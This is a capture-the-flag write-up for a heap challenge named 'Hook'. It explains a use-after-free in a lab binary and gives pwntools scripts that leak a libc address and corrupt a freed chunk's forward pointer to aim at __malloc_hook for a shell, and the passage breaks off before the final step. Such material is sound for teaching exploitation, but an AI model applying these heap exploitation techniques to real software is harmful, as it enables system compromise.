# Hook
> Write-up author: jon-brandy

## Lessons Learned:
- Code Review.
- Exploiting double free vuln.
- Overwrite __malloc_hook() with one_gadget.

## DESCRIPTION:

Go and install your favorite hook! malloc or free? Which do you prefer?

## HINT:
- NONE

## STEPS:
1. In this challenge we're given a 64 bit binary, not stripped, and dynamically linked.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/802741f5-a8cb-45da-853d-5dc3657c31c7)


> Binary Protections

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/c8049608-a580-4e9b-a7ec-4d2433dbd59c)


2. Upon reviewing the source code, seems we can create chunks up to 6 times, free the chunk, and edit it's content.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/4a5002f7-3ca7-4423-8bd9-f4e01545f50a)


3. Found the vuln at the free() function which not set the freed chunks pointer to NULL. This could be leverage to do UAF or double free.
4. The worst outcome is to spawn shell by overwriting `__malloc_hook()` or `__free_hook()` to `system("/bin/sh")`.
5. So everytime it called, the binary should just executes `system("/bin/sh")`.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/f48599d7-1ea5-4eaa-ba20-e1486309b3ab)


6. Reviewing the main() function, seems we do not need to leak main_arena address, because libc puts printed.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/302fc1f0-6785-4092-9901-f88128239198)


7. However, we can't do double free because the libc version has protection for that.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/66688fc1-2d03-4e4a-a145-8f01069e2ce5)

> PROOF

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/97511c87-3e96-4596-90f1-c14128c0c4e3)


8. BUT, noticed there is an edit() function, which we can use to overwrite the metadata of the second chunk.
9. So we can overwrite it's FD with fake fast near `__malloc_hook()`.

### Exploit Strategy

```
- Overwrite FD's of the second chunk with fake fast near __malloc_hook().
- Identify the correct padding to overwrite __malloc_hook() with one_gadget.
```

10. Now let's identify the offset to drop `__malloc_hook()`.

> TEMPORARY SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

exe = './task'
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

library = './libc-2.31.so'
libc = context.binary = ELF(library, checksec=False)

def malloc(size, data: bytes):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', f'{size}')
    sh.sendlineafter(b':', data)

def free(index: int):
    sh.sendlineafter(b'>', b'2')
    sh.sendlineafter(b':', f'{index}')

def edit(index, data):
    sh.sendlineafter(b'>', b'3')
    sh.sendlineafter(b':', f'{index}')
    sh.sendlineafter(b':', data)

sh = process(exe)
# sh = remote('rivit.dev', 10024)

sh.recvuntil(b'puts @ ')
get = sh.recvline().strip()
leaked = eval(get)
log.success(f'LEAKED LIBC PUTS --> {leaked}')

libc.address = leaked - libc.sym['puts']
log.info(f'LIBC ADDRESS --> {hex(libc.address)}')

malloc(0x68, b'A' * 8)
malloc(0x68, b'B' * 8)

free(0)
free(1)

gdb.attach(sh)

sh.interactive()
```

> RESULT

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/a49de579-0e3a-4fb6-9fbb-2f31bb725f30)


11. Found the offset at 51.
12. Great! Now let's overwrite the second chunk with `__malloc_hook` by adding this LOCs.

```py
sh.sendlineafter(b'>', b'3')
sh.sendlineafter(b':', b'1')
sh.sendlineafter(b':', pack(libc.sym['__malloc_hook'] - 51))
```

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/a92df7ed-b605-410a-81a3-8d8f506ae763)


13. Now let's identifyt he correct pads to overwrite it's FD.
14. The easiest way is to allocate 0x68 sized field but filled it with 0x60 junk data so it would not go to segfault.

> Identify offset

